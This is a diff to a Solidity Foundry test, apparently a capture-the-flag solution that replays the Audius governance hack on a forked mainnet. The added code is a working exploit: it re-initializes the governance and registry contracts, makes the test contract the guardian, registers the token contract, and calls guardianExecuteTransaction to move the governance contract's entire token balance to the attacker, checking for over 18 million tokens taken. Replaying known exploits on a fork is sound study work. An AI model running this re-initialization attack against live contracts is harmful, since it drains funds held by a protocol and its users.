@@ -30,10 +30,35 @@ contract ContractTest is DSTest {
     }
 
     function testAudiusHack() public {
-        vm.createSelectFork("INSERT MAINNET RPC", 15201700);
+        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 15201700);
         console.log("Audius Balance: ", token.balanceOf(address(this)));
 
         // HACK AWAY! (Don't forget you can use vm.roll(newBlock) to simulate multiple blocks)
+
+        // @ctf: contracts can be initialized again, as `initialized` is set to false at the end of the modifier
+
+        emit log_named_uint("to steal", token.balanceOf(address(gov)));
+
+        uint256 per = gov.getVotingPeriod();
+        uint256 exec = gov.getExecutionDelay();
+        uint16 max = gov.getMaxInProgressProposals();
+
+        gov.initialize(
+            address(reg),
+            per,
+            exec,
+            1,
+            max,
+            address(this) // set guard to this to exec freely
+        );
+        reg.initialize();
+
+        bytes32 name = bytes32(uint256(69420));
+        reg.addContract(name, address(token));
+        // add token contract to "transfer"
+
+        bytes memory data = abi.encode(address(this), token.balanceOf(address(gov)));
+        gov.guardianExecuteTransaction(name, 0, "transfer(address,uint256)", data);
 
         console.log("Audius Balance: ", token.balanceOf(address(this)));
         require(token.balanceOf(address(this)) > 18_000_000 ether, "do better!");
